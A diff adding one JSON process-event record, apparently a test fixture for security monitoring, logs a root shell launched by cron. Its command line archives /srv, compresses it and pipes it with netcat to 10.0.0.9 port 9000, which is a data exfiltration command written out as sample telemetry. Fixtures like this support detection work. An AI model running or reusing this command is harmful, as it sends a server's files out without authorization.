@@ -1,0 +1,12 @@
+{
+  "source": "process",
+  "process": {
+    "pid": 31337,
+    "ppid": 4100,
+    "comm": "sh",
+    "exe": "/usr/bin/dash",
+    "cmdline": "sh -c mkfifo /tmp/pv.fifo; gzip < /tmp/pv.fifo | nc 10.0.0.9 9000 & tar cf /tmp/pv.fifo /srv",
+    "uid": 0
+  },
+  "parent_comm": "cron"
+}
